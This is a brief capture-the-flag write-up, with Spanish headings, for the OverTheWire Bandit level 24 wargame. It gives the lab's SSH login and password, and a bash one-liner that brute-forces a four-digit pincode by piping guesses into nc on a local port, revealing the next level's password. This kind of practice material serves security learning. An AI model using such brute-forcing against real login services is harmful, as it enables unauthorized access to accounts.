# Objetivo
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time


# Datos de acceso al nivel
ssh bandit24@bandit.labs.overthewire.org -p 2220
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar


# Solución
```
for i in {5000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002


Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
bandit24@bandit:~$
```

# Notas adicionales
 

# Referencias